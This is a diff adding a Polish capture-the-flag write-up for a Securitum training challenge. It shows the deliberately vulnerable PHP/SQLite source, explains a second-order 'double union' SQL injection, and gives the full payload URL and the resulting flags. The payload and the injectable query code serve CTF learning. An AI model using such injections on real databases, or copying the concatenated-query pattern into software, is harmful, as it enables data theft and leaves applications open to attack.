@@ -231,6 +231,62 @@
 
 
 
+### [Do najprostszych nie należy](http://training.securitum.com/rozwal/gim/gimnazjum4/)
+
+[Rozwiązanie](http://training.securitum.com/rozwal/gim/gimnazjum4/?id=11111%20union%20select%20%27hania%22%20union%20select%20name%20from%20flags%20where%20%221%22=%221%27): _DoubleUnion_
+
+**Metoda**:
+
+1. Zajrzeć w źródło strony:
+
+    ```php
+    <!--?php
+    readfile(__FILE__);
+    $db= new SQLite3('db.db');
+    $_GET['id'] = str_replace('-','',$_GET['id']);
+
+    $odp='';
+
+    $res = $db-->
+ 
+    query('SELECT name FROM flags WHERE id='.$_GET['id'].' LIMIT 1');
+    while($r=$res-&gt;fetchArray()) {
+	    $odp=$r['name'];
+    }
+
+    $res = $db-&gt;query('SELECT count(*) FROM flags WHERE name="'.$odp.'"');
+    while($r=$res-&gt;fetchArray()) {
+	    echo $r[0];
+    }
+    ```
+
+2. Do wyniku pierwszego zapytania przechowywanego w zmiennej `odp` trzeba dokleić kawałek kodu SQL, który
+   pozwoli na atak podczas drugiego zapytania.
+   
+   Przez obecność `LIMIT 1`, wynik zapytania o id powinien zwrócić 0 wyników, żeby pod uwagę był brany drugi człon zapytania, które
+   chcemy dokleić.
+   
+   Aby upewnić się, że wstawiamy id, które nie istnieje wystarczy zapytanie:
+   [http://training.securitum.com/rozwal/gim/gimnazjum4/?id=11111](),
+   które wypisuje 0 na stronie.
+   
+3. Następnie należy dopisać kawałek zapytania, które będzie zawiera w sobie stringa z kolejnym wstrzykiwanym
+   zapytaniem i zostanie przekazane do zmiennej `odp`:
+   `union select 'hania" union select name from flags where "1"="1'`
+   
+   Istotne są różne znaki ' i ", żeby nie zniszczyć struktury zapytania.
+   
+4. Całe zapytanie przesłać w URLu:
+
+   `?id=11111 union select 'hania" union select name from flags where "1"="1'`
+
+   Odpowiedź:
+
+   `0ROZWAL_NIE_TEN_FORMATROZWAL_{DoubleUnion}ROZWAL_{OdZjazduGimboliGlowaBoli}ROZWAL_{SelectNameFromGimbus}ROZWAL_{ZjazdGimboli}`
+
+
+
+
 
 ## [Zerówka](https://stary.rozwal.to/zadanie/11)
 
